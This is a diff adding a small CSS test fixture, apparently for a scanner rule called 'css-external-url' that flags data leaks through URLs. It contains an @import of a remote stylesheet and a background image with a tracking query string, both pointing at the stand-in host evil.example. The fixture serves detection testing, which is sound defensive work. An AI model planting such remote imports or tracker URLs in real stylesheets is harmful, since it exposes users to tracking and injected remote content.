@@ -1,0 +1,11 @@
+/* CSS data-exfil-via-url signals (§1.2). Rule: css-external-url */
+
+/* @import of a remote stylesheet */
+@import url("https://evil.example/remote.css");
+
+body {
+  margin: 0;
+  /* url() to an off-package external origin */
+  background: #111 url("https://evil.example/tracker.png?u=1") no-repeat;
+  color: #eee;
+}
